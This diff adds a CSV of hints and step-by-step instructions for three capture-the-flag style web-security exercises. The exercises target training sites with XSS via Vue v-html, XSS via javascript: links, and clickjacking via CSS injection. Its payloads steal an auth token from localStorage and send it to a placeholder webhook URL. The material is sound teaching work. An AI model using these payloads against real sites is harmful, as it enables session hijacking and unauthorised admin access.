@@ -1,0 +1,54 @@
+Exercise,Key,English,Code
+Exercise 1,title,Exercise One: Cross-Site Scripting with v-HTML.,
+Exercise 1,description,"A new website has launched: Beautiful Quotes! This website allows you to share your quotes with the world, using the styling of your choice. Unfortunately, the website is vulnerable to a cross-site scripting attack. Can you steal the admin token and reveal the flag?",
+Exercise 1,websiteUrl,https://beautiful-quotes.rexvalkering.nl,
+Exercise 1,hints,Try to add a quote with bolded text.,
+Exercise 1,hints,Try to add a quote that triggers an alert box!,
+Exercise 1,hints,Look in the local storage of your browser. What is the key / name of the authentication token?,
+Exercise 1,hints,Replace the alert from step 2 with a console.log that logs the value of the token to the console.,
+Exercise 1,hints,Replace the code of step 4 with some code that sends the authentication token to your webhook.site link.,
+Exercise 1,hints,"Replace the authentication token in your localStorage with the token retrieved from your webhook, then reveal the flag!",
+Exercise 1,instructions,"In the quote field, enter the code below and submit it. Confirm that the quote submitted is in bold.",<strong>This is a quote</strong>
+Exercise 1,instructions,"In the quote field, enter the code below and submit it. This code inserts an image object without an actual image, and defines an 'error handler' for when it cannot be loaded. Do you see that you are able to execute some javascript in someone elses browser?","<img src="""" onerror=""alert('Hello World!')"" />"
+Exercise 1,instructions,Being able to run javascript in someone elses browser is a huge security issue. The next step is to use this to steal secret tokens. This application stores an API token in the Local Storage. Go to the website's Local Storage and look for the API token. What is the name?,In Chrome: F12 → Application → Local Storage. In Firefox: F12 → Storage → Local Storage.
+Exercise 1,instructions,We’re going to trick the admin into sending us his API token. For this we first need to create a page where our code can send the API token to. Go to webhook.site and copy the URL under “Your randomly generated URL”. Don’t close this site yet!,
+Exercise 1,instructions,It’s time to hack the admin! Copy the code below and replace YOURURLHERE with the url you just copied. Enter it in the quote field and submit the quote.,"<img src="""" onerror=""var i = new Image(); i.src='YOURURLHERE?token=' + localStorage.getItem('auth-token');"" />"
+Exercise 1,instructions,"Go to your webhook.site URL. You should see two requests pop up on the left side, with different API tokens. One is your token, another is the admins. Copy the API token of the administrator.",
+Exercise 1,instructions,Go back to Local Storage (see step 3) and replace the API token with the token you just stole. Refresh the website and click on “Reveal the flag”. Congratulations!,
+Exercise 2,title,Exercise Two: Cross-Site Scripting with v-href.,
+Exercise 2,description,"After your vicious hack of the previous website, the admin has returned with a superior successor: Beautiful Quotes 2! Unfortunately, the v-html vulnerability has been patched; however, the administrator has added some other functionality which can be abused. Can you execute another cross-site scripting attack to steal the admin's token and reveal the flag?",
+Exercise 2,websiteUrl,https://beautiful-quotes-2.rexvalkering.nl,
+Exercise 2,hints,Add a quote with a URL in the source. What happens to the URL?,
+Exercise 2,hints,"Add a quote where the URL is not a URL, but triggers an alert box instead.",
+Exercise 2,hints,Remember the previous exercise? You know what to do next!,
+Exercise 2,instructions,"Does the previous hack still work? If you add the following code to the 'quote' field, do you see bolded text?",
+Exercise 2,instructions,"A new input field called ""Source"" has appeared. This is where you can add a URL to make the author a clickable link. Add a quote with a valid URL in the source and confirm that the link is now clickable.",Example URL: https://google.com/
+Exercise 2,instructions,"A URL should always start with http:// or https://. What happens if you add something else, for example 'test'. Is the link still clickable?",
+Exercise 2,instructions,Programmers often forget that links don't have to be links: they can also execute javascript! Add the code below in the Source field. What happens after you click the link?,javascript: alert(1);
+Exercise 2,instructions,"What you just did is also called Cross Site Scripting, only it has the downside that you must trick the user into clicking the link. Fortunately, the admin always clicks the link when visiting this website. The next steps are the same as the steps from the previous exercise. Do you know what to do?",
+Exercise 2,instructions,"Copy and paste the code below in the Source field. Don't forget to replace YOURURLHERE with your webhook.site link, like you did in exercise 1.",javascript: var i = new Image(); i.src='YOURURLHERE?token=' + localStorage.getItem('auth-token');
+Exercise 2,instructions,"Go to your webhook.site URL. You should see two requests pop up on the left side, with different API tokens. One is your token, another is the admins. Copy the API token of the administrator.",
+Exercise 2,instructions,Go back to Local Storage (see step 3) and replace the API token with the token you just stole. Refresh the website and click on “Reveal the flag”. Congratulations!,
+Exercise 3,title,Exercise Three: Clickjacking with v-style and v-href.,
+Exercise 3,description,"The administrator has barely recovered from your latest hack and you are already gearing up for your next one. With the help of a security expert, the admin has removed all XSS vulnerabilities, but thanks to new additions the site is still not fully secure. Can you pull one last heist?",
+Exercise 3,websiteUrl,https://beautiful-quotes-3.rexvalkering.nl,
+Exercise 3,hints,Add a quote with a style. Where is the style applied?,
+Exercise 3,hints,Add a quote with a bigger font size style applied.,
+Exercise 3,hints,"It looks like the admin is not clicking on our links anymore. If they were, what link would you want them to click?",
+Exercise 3,hints,"Can you trick the admin into clicking your link, using styling?",
+Exercise 3,instructions,"This is a hard exercise that showcases how a hacker pieces together different pieces of information, and how they can work around limitations of the webpage. It can become a bit technical, so don't forget to ask for help if you need it.",
+Exercise 3,instructions,"Last time, we added some javascript to the URL. Try to add the code below to the author source; what happens now? Is the link still clickable?",javascript: alert(1);
+Exercise 3,instructions,"It seems the admin has removed all Cross Site Scripting vulnerabilities. Perhaps we can find something else we can exploit. Try adding a quote with a valid URL, and with bold 'Author styling'. Confirm that the link is now clickable, and that the link is using bold text.",
+Exercise 3,instructions,"Now it's getting a bit more technical. Right-click the Author Styling dropdown field, and select 'Inspect' (Chrome) or 'Inspect Element' (Firefox). The new screen shows the code of the webpage you are looking at. The piece of code you selected probably looks like the code below. What you see here is an 'option' element with a value.","<option value=""font-weight: bold"">Bold</option>"
+Exercise 3,instructions,Look at the value for 'bold'. The value looks like CSS code. Maybe we can abuse that?,
+Exercise 3,instructions,"Double-click on 'font-weight: bold' in the code inspection screen. You should now be able to edit it. Change it to the code below. Now, click the dropdown again, select 'Bold', then add a valid URL and a quote and submit the form. If you're doing it right, the author text should be really big!",font-size: 50px
+Exercise 3,instructions,"We can change the style of author as we like, but right now this is useless. We need to look some more at this website to continue. What other elements are new?",
+Exercise 3,instructions,"To the right of each quote is a 'Make admin' button. If you click it, nothing happens. This is because the button is disabled.",
+Exercise 3,instructions,"Try right-clicking the button and selecting 'Inspect element' again. it should look something like the code below. There is a property on it, disabled=""disabled"". This disables the button. Try double-clicking it and hitting backspace a couple of times to remove it. Is the button now clickable? Does something happen when you click the button?","<button data-v-97e12a22="""" class=""btn btn-primary admin-button"" disabled=""disabled"">Make admin</button>"
+Exercise 3,instructions,"Even though you've enabled the button, nothing happens when you click it. Is there perhaps another screen for programmers that can give us more information?",
+Exercise 3,instructions,"In the programmer screen, you should see multiple tabs, such as 'Elements', 'Console', 'Sources' and 'Network'. Click the Console tab. Though the text may look cryptic, it does give you some valuable information.",
+Exercise 3,instructions,"The console tab shows something similar to the text below. This means that, on clicking the link, you are going to another page, which looks like https://beautiful-quotes-3.rexvalkering.nl/make-admin/12345678. We do not have permissions to click the link though. Hmm, perhaps we can abuse this?",Caught navigation to https://beautiful-quotes-3.rexvalkering.nl/make-admin/12345678; doing a makeAdmin dispatch instead.
+Exercise 3,instructions,"Copy the link from the 'Console' tab and paste it into the Source input, then submit a quote. Is it a valid URL?",
+Exercise 3,instructions,"We now have a valid URL and we have control of the styling. Our goal is to trick the admin into clicking the link. Look at the text at the top of the page, which tells us what the admin does.",
+Exercise 3,instructions,"First, edit the 'value' of Bold to the code below. Second, add the URL from the previous step in the Source field. Add a quote and submit the URL. This creates a URL that is styled over the 'Logout' link, which the admin clicks when they try to log out. You've just tricked them into making you an administrator!",position:fixed;top:500px;left:50px;height:200px;width: 300px;z-index: 1;
+Exercise 3,instructions,Refresh the page and claim your final flag.,
